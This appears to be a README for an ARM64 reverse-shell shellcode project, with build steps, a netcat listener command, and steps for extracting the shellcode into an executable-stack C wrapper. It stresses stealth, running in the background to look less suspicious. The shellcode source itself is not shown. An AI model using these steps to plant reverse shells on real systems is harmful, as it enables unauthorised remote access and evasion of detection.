# ARM-Shellcode 🐚
ARM AARCH64 Reverse Shell.

## Capabilities
A small, stealthy ARM64 reverse shell that utilizes `clone()`, similar to `fork()`, in order to spawn a child process and run in the background. Ultimately to look less suspicious.

# Compiling 🛠️
## Linux/AARCH64 as a guest OS on a MAC or other ARM-based device
`as arm-revshell.s -o arm-revshell+clone.o && ld -N arm-revshell+clone.o -o arm-revshell`

### Begin a Netcat Listener 
`nc -lnvp 1337`

### Execute

Then, run `./arm-revshell+clone` to execute.

## x86-64 host OS, but you want to run/compile for AARCH64
`aarch-linux-gnu-as arm-revshell+clone.s -o arm-revshell+clone.o && aarch-linux-gnu-ld -N arm-revshell+clone.o -o arm-revshell+clone`

### Begin a Netcat Listener
`nc -lnvp 1337`

### Execute
Then, run `qemu-aarch64 ./arm-revshell+clone` to execute.`

## Utilizing the Shellcode "Wrapper"
This is to show you that we can achieve the same cyber result, just in a different executable format. It also goes to show how easily it is to "fit" shellcode into places.

**First, we must use `objcopy` to save the binary object to a `.bin` file so we can convert it into an easily copiable format:**
`objcopy -O binary arm-revshell+clone arm-revshell+clone.bin`

**Then, we need to utilize `hexdump` to "carve" out the shellcode from the binary object:**
`hexdump -v -e '"\\""x" 1/1 "%02x" ""' arm-revshell+clone.bin > shellcode.txt`

Lastly, we need to copy the contents of `shellcode.txt` into the `shellcode[]` buffer, within the `shellcode-exec.c` file.

### Compile the "Wrapper"
`gcc shellcode-exec.c -o shellcode-exec -z execstack -fno-stack-protector`

## Reverse Shell Time!!!
We can now easily call our shellcode within a C program.

**Start a Netcat Listener:**
`nc -lnvp 1337`

**Execute the program:**
`./shellcode-exec`

**CONGRATS, SHELLCODE EXECUTED! ENJOY!**


